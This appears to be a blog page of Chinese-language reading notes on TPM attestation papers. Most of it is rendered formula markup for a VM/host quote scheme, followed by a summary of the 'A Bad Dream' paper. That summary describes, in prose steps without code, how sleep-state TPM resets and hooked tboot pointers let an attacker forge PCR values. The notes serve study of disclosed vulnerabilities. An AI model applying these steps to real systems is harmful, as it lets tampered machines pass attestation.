style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">9</span></span><span class="mord">)</span></span></span></span></span></span></p><p>随后，<code>ICA</code>使用<code>vTPM</code>根据式(10)进行签名，并将生成的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>V</mi><msub><mi>M</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow></msub></mrow><annotation encoding="application/x-tex">Quote_{V M_{2j}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0307em;vertical-align:-0.3473em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3473em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>M</mi><msub><mi>L</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">vML_{2j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>一起发送给<code>TA</code>。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>V</mi><msub><mi>M</mi><mrow><mn>2</mn><mi>i</mi></mrow></msub></mrow></msub><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mo stretchy="false">(</mo><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub><mo separator="true">,</mo><mi>v</mi><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><msub><mo stretchy="false">)</mo><mrow><mi>A</mi><mi>I</mi><mi>K</mi></mrow></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(10)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Quote_{VM_{2i}}=sig(vPCR_{2j},vPCR&#x27;_{2j},nonce)_{AIK}\tag{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9334em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">10</span></span><span class="mord">)</span></span></span></span></span></span></p><p>同样，主机中的<code>ICA</code>根据式（11）计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">PCR_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">HMAC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，并利用<code>TPM</code>执行签名操作（公式(12)）。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(11)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">PCR&#x27;_2=HMAC(PCR_2,nonce)\tag{11}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0489em;vertical-align:-0.247em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">11</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Q</mi><mi>u</mi><mi>o</mi><mi>t</mi><msub><mi>e</mi><mrow><mi>H</mi><mi>o</mi><mi>s</mi><msub><mi>t</mi><mn>2</mn></msub></mrow></msub><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><msub><mi>R</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(12)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Quote_{Host_2}=sig(PCR_2,PCR_2&#x27;,nonce)\tag{12}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9334em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Hos</span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.052em;vertical-align:-0.2501em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">12</span></span><span class="mord">)</span></span></span></span></span></span></p></li></ul><h2 id="疑问-2">疑问</h2><p>如果在循环验证的过程中，只有一个云服务器的情况下，应该让谁来验证它。也就是n=1的时候，如何做验证。</p><h1 id="A-Bad-Dream-Subverting-Trusted-Platform-Module-While-You-Are-Sleeping">A Bad Dream: Subverting Trusted Platform Module While You Are Sleeping</h1><h2 id="Abstract-2">Abstract</h2><p>两种针对电源管理的可信平台模块（TPM）攻击。一种攻击是利用TPM 2.0规范中用于度量的静态信任根（SRTM）的设计缺陷。另一种攻击是利用tboot中的一个实现缺陷，tboot是英特尔可信执行技术（Trusted Execution Technology）中最流行的测量启动环境。</p><h2 id="Introduction-2">Introduction</h2><p>介绍了可信平台模块（Trusted Platform Module， <code>TPM</code>）的基本概念，以及度量过程和<code>PCR</code>。</p><p>指出<code>TPM</code>芯片需要与其他固件共同工作，合作机制无法明确规定将导致安全漏洞。而<mark>电源管理</mark>的工作方式就非常复杂，因为每个外围设备都有自己的电源状态，独立于系统范围的电源状态。</p><p>电源接口（Advanced Configuration and Power Interface， <code>ACPI</code>）是一种开放的行业规范，它使以操作系统为中心的智能和动态管理能够与电源管理感知设备（如cpu、网络、存储和图形处理单元）进行协调。</p><p>当电源状态发生变化时，<code>TPM</code>不能安全地保持状态。在两种类型的<code>RTM</code>（静态和动态）中都发现了漏洞，静态<code>RTM </code>（<code>SRTM</code>）的漏洞是由TPM2.0规范的设计漏洞造成的。动态<code>RTM </code>（<code>DRTM</code>）的漏洞是由于开源项目<code>tboot</code>中的一个错误造成的。</p><p>这些漏洞使攻击者可以在系统唤醒时重置和伪造<code>pcr</code>。</p><h2 id="Background">Background</h2><h3 id="TPM-Technology">TPM Technology</h3><p>介绍了可信链以及信任度量时<code>PCR</code>的作用、<code>TPM</code>的作用，并且提到了核心RTM（CRTM）的作用。介绍了<code>SRTM</code>和<code>DRTM</code>的启动过程。</p><h3 id="ACPI-Sleeping-States">ACPI Sleeping States</h3><p>介绍了<code>ACPI</code>以及四种全局电源状态：工作状态（<code>G0 </code>或 <code>S0</code>）、睡眠状态（<code>G1</code>）、软关机状态（<code>G2</code>）和机械关机状态（<code>G3</code>）。睡眠状态分为四种：</p><ul><li>S1</li><li>S2</li><li>S3</li><li>S4</li></ul><p>概述保存和恢复<code>TPM</code>状态的步骤</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127105830940.png" alt="image-20241127105830940"></p><p>TPM在系统进入睡眠模式（如S3、S4）时保存状态，唤醒后恢复。</p><p>描述了睡眠和恢复过程中涉及的操作系统与BIOS/UEFI合作。</p><h2 id="Assumptions-and-Threat-Model">Assumptions and Threat Model</h2><h3 id="Assumptions-2">Assumptions</h3><p>首先，假设系统使用TCG的<code>SRTM</code>来测量固件和引导程序,并将测量结果存储在<code>TPM</code>芯片中。</p><p>第二，假设系统采用TCG的<code>DRTM</code>架构。</p><p>最后，假设<code>TPM</code>中存储的测量值由远程证明者验证。</p><h3 id="Threat-Model">Threat Model</h3><p>攻击者被设定为拥有Ring-0权限，能修改启动加载器和内核，但不能物理接触硬件。</p><h2 id="Vulnerability-Analysis">Vulnerability Analysis</h2><h3 id="Finding-the-Security-Vulnerabilities">Finding the Security Vulnerabilities</h3><p>利用<code>TPM</code>和<code>SRTM</code>/<code>DRTM </code>技术启动系统涉及许多实体，如图显示了它们之间的关系。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127111513711.png" alt="image-20241127111513711"></p><p>发现漏洞的步骤如下：</p><ol><li><strong>审查规范</strong>：发现在电源管理方面，TPM 2.0规范相较于TPM 1.2更容易引发状态重置问题。</li><li><strong>测试实现</strong>：在多种硬件和固件实现中，发现<code>SRTM</code>和<code>DRTM</code>均存在不符合规范或实现缺陷的问题。</li><li><strong>漏洞确认</strong>：实验验证了这些问题普遍存在于多个厂商的设备中。</li></ol><h3 id="SRTM-Vulnerability-CVE-2018-6622">SRTM Vulnerability: CVE-2018-6622</h3><h4 id="Problem-The-Grey-Area">Problem: The Grey Area</h4><p>介绍了当平台进入S3或S4休眠状态时，切断设备电源，此时<code>TPM</code>应该将其状态保存到非易失性随机存取存储器（<code>NVRAM</code>）中，稍后再恢复状态。因此，一些平台允许软件重置<code>PCR</code>并任意扩展测量。</p><p><code>TPM</code>有两种主要电源状态：工作状态（<code>D0</code>）和低功耗状态（<code>D3</code>）。在进入<code>D3</code>状态前，<code>TPM</code>需要保存当前状态，在恢复到<code>D0</code>状态时它可以恢复保存的状态。</p><p>根据TPM 1.2规范，在进入S3睡眠状态时，操作系统会通知TPM保存状态（通过<code>TPM_SaveState()</code>命令）。在从S3恢复时，静态信任根（<code>S-CRTM</code>）决定是恢复先前的状态还是重新初始化<code>TPM</code>。如果没有保存的状态，TPM进入故障模式，直到系统重启。</p><p>而在TPM 2.0规范中，即使没有保存状态，<code>TPM</code>也会返回<code>TPM_RC_VALUE</code>，仍允许重新启动。此时，<code>S-CRTM</code>需要重置<code>TPM</code>并执行<code>TPM2_Startup(CLEAR)</code>命令，然后再交给操作系统控制。</p><p>当<code>TPM</code>没有保存状态时，它的状态如果被重置的话会导致<code>TPM</code>恢复到清除状态，此时攻击者可以向<code>PCR</code>扩展任意值。</p><h4 id="Exploit-Scenario">Exploit Scenario</h4><p>如果攻击者控制了系统软件，包括引导加载程序和内核，首先从正常启动过程中提取有效的哈希值，并将其存储在RAM中。然后，在系统进入休眠状态后，攻击者使用这些哈希值伪造<code>PCR</code>值，使得<code>TPM</code>显示系统仍在使用原始软件启动和运行，尽管实际上系统已经被篡改。如图：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241127141928178.png" alt="image-20241127141928178"></p><h4 id="Implementation-in-Detail">Implementation in Detail</h4><ol><li><strong>提取正常的哈希值</strong>：攻击者首先需要获取正常的哈希值，这些哈希值可以从TCG事件日志中提取。事件日志中记录了每个扩展到PCR的值，以及事件类型和相关的哈希值。</li><li><strong>获取事件日志</strong>：通过修改现有的启动加载器和内核，攻击者可以通过UEFI接口调用<code>GetEventLog()</code>来提取事件日志，并将日志传递给内核。日志数据存储在特定的内存区域（64KB内存块），并在启动后仍然保留。</li><li><strong>重置TPM并重放哈希</strong>：攻击者通过让系统进入S3睡眠状态来重置<code>TPM</code>，并利用提取的正常哈希值依次扩展到<code>PCR</code>，伪造一个正常的启动序列。该过程通过内核中的<code>tpm_pcr_extend()</code>函数实现。</li><li><strong>修改启动加载器和内核</strong>：攻击者定制了启动加载器和内核，使其能够提取事件日志并伪造PCR值。特别是，启动加载器的哈希值和内核（包括内核文件和初始化RAM磁盘文件）的哈希值通过特定的事件类型（如EV_EFI BOOT_SERVICES_APPLICATION和EV_IPL）来识别。</li><li><strong>TPM重置过程</strong>：要重置TPM，攻击者需要修改内核，使其跳过保存TPM状态的步骤，并调用<code>TPM_Startup(CLEAR)</code>命令。此外，攻击者还需要通过系统的休眠命令使系统进入睡眠状态，然后再唤醒系统以重放正常的哈希值。</li></ol><h3 id="DRTM-Vulnerability-CVE-2017-16837">DRTM Vulnerability: CVE-2017-16837</h3><h4 id="Problem-Lost-Pointer">Problem: Lost Pointer</h4><p><code>DRTM</code>依赖动态平台配置寄存器（PCRs17-22）存储测量值，通过硬件受信保护的动态启动事件（Dynamic Launch Event, <code>DLE</code>）初始化，正常情况下只有硬件可访问。</p><p>但在从S3/S4睡眠状态恢复时，<code>DRTM</code>也会重新初始化，存在篡改的机会。更严重的是，<code>tboot</code>（Intel TXT 的开源实现）中的部分可变的函数指针未被测量，这使得攻击者可以通过修改这些指针来控制测量流程。</p><h4 id="Exploit-Scenario-2">Exploit Scenario</h4><p>为了破坏动态信任根（<code>DRTM</code>）的安全性，攻击者需要伪造扩展到动态<code>PCR</code>的测量值。虽然<code>DCE</code>（动态配置环境）在启动<code>DLME</code>（动态加载测量环境）之前会先测量并扩展<code>DLME</code>的值，这使得伪造测量值变得困难，但如果<code>DLME</code>本身存在漏洞，攻击者仍然可以破坏动态信任链。</p><p>攻击流程与<code>SRTM</code>的攻击类似，包括以下步骤：</p><ol><li>攻击者从正常启动过程中生成的事件日志中提取合法的哈希值。</li><li>通过触发系统进入睡眠状态，重置动态<code>PCR</code>的状态。</li><li>恢复时，攻击者通过钩住 <code>DCE</code>和 <code>DLME</code>中的函数，将提取的合法哈希值重新扩展到动态 PCR。</li></ol><p>攻击的最终效果与<code>SRTM</code>攻击一致：伪造动态<code>PCR</code>的测量值，使其显示系统处于可信状态，同时隐藏系统已经被篡改的事实。</p><h4 id="Implementation-in-Detail-2">Implementation in Detail</h4><ol><li><strong>提取正常启动测量值</strong><br>攻击的第一步是获取正常启动时的动态<code>PCR</code>值。<code>tboot</code>在启动过程中记录事件日志，这些日志包含<code>PCR</code>的扩展顺序和测量值（如启动加载器、内核文件及<code>initrd</code>的哈希）。攻击者通过<code>tboot</code>的工具（如<code>txt-stat</code>）提取这些日志，或直接访问BIOS/UEFI暴露的内存区域，将这些值存储备用。</li><li><strong>挂钩<code>tboot</code>的函数指针</strong><br>在<code>tboot</code>实现中，某些全局变量（如<code>g_tpm</code>、<code>tpm_12_if</code>和<code>tpm_20_if</code>）存储在数据段和未初始化数据段（.bss），这些区域未被SINIT ACM测量。攻击者通过篡改这些变量，将其指向自定义的挂钩函数。挂钩后的函数接管测量逻辑，负责伪造动态<code>PCR</code>的扩展值。</li><li><strong>重置动态PCR并注入伪造值</strong><br>当系统进入S3或S4睡眠状态时，<code>TPM</code>会被置于低功耗模式，<code>动态PCR</code>清空。唤醒后，SINIT ACM重新启动测量流程并扩展新的<code>PCR</code>值。此时，攻击者的挂钩函数拦截测量操作，将日志中的正常测量值按顺序扩展到<code>PCR</code>，伪造系统为可信状态。</li></ol><p>整个攻击完成后，<code>动态PCR</code>显示的测量值与正常启动时完全一致，隐藏了系统被篡改的事实。攻击利用了<code>tboot</code>在数据段的测量漏洞，以及<code>TPM</code>睡眠模式下<code>动态PCR</code>的重置机制，展示了<code>DRTM</code>中关键实现的安全隐患。</p><h3 id="Evaluation">Evaluation</h3><ul><li><p>作者测试了多个基于Intel处理器的设备，包括支持TPM1.2和TPM2.0的设备，采用了不同的硬件厂商和BIOS版本。</p></li><li><p>测试系统使用Ubuntu16.04.03操作系统，内核版本为4.13.0-21-generic，并对<code>GRUB</code>（用于SRTM攻击）和<code>tboot</code>（用于DRTM攻击）进行了定制修改。</p></li></ul><h4 